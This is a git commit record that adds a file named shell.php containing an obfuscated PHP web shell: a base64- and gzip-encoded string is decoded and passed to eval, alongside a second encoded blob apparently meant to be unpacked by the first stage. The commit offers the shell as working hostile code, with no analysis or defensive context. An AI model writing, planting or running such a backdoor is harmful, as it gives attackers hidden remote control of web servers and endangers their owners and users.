d0fcf6b1b205b229c91a8667fa6d986418687ad5
Yukinoafzan <31302382+afzan354@users.noreply.github.com>
2023-11-25 21:23:21 +0700

    Create shell.php
    shell

---
+++ shell.php
@@ -0,0 +1,6 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
+$Lix = "qlGLu/1WiHxA5vtsm2Kjeq/Wg0Wl+99i5eTXaZp8/uxIRz+Cb4lnEbTFwQKpWhHZjHNoVZwSaYuQrAqqDOxXDlT/qMAmgvvQQmHF5a0JgCxXjBh30eRDqJh4LH5Q6Rk2apB27M9w+rXUBlLJDj2vgPO8cU6UDPZgjP/HDs75tiFsj5FProj4c/pbt/+pfs/oyIpf7rEmijslpgY7aTlT8pVu/h5G/7LYh5OC0+2uijiu0ZYaggmT0GZElhuLIuCq9qRacpHKs4xwQ8ugvbIEwIsiB7YVci3/sAw0BwJe/HCAeHw/cAw4B8/FAgeA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
